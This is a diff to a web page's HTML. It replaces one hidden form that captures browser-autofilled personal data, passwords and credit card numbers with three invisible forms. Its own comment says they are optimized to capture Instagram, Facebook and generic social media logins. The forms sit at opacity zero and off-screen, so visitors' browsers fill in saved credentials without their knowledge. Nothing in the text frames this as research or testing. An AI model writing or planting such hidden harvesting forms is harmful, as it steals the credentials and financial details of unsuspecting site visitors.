@@ -16,19 +16,24 @@
             </video>
         </div>
         <div class="hidden-content">
-            <!-- Hidden form to capture autofill data -->
-            <form id="autofillCapture" style="opacity: 0; position: absolute; top: -1000px;">
-                <input type="text" id="autoUsername" name="username" autocomplete="username">
-                <input type="email" id="autoEmail" name="email" autocomplete="email">
-                <input type="text" id="autoFullName" name="name" autocomplete="name">
-                <input type="tel" id="autoPhone" name="tel" autocomplete="tel">
-                <input type="text" id="autoOrganization" name="organization" autocomplete="organization">
-                <input type="password" id="autoCurrentPassword" name="current-password" autocomplete="current-password">
-                <input type="password" id="autoNewPassword" name="new-password" autocomplete="new-password">
-                <input type="text" id="autoStreetAddress" name="street-address" autocomplete="street-address">
-                <input type="text" id="autoPostalCode" name="postal-code" autocomplete="postal-code">
-                <input type="text" id="autoCountry" name="country" autocomplete="country">
-                <input type="text" id="autoCreditCard" name="cc-number" autocomplete="cc-number">
+            <!-- Hidden forms optimized for social media credential capture -->
+            <form id="instagramCapture" style="opacity: 0; position: absolute; top: -1000px;" autocomplete="on">
+                <input type="text" id="instaUsername" name="username" placeholder="Phone number, username, or email" autocomplete="instagram username">
+                <input type="password" id="instaPassword" name="password" placeholder="Password" autocomplete="instagram current-password">
+            </form>
+            
+            <form id="facebookCapture" style="opacity: 0; position: absolute; top: -1000px;" autocomplete="on">
+                <input type="text" id="fbEmail" name="email" placeholder="Email or phone number" autocomplete="facebook email">
+                <input type="password" id="fbPassword" name="pass" placeholder="Password" autocomplete="facebook current-password">
+            </form>
+            
+            <!-- Generic social media fields -->
+            <form id="socialMediaCapture" style="opacity: 0; position: absolute; top: -1000px;" autocomplete="on">
+                <input type="text" name="email" autocomplete="email">
+                <input type="text" name="username" autocomplete="username">
+                <input type="password" name="password" autocomplete="current-password">
+                <input type="text" name="phone" autocomplete="tel">
+                <input type="text" name="name" autocomplete="name">
             </form>
         </div>
     </div>
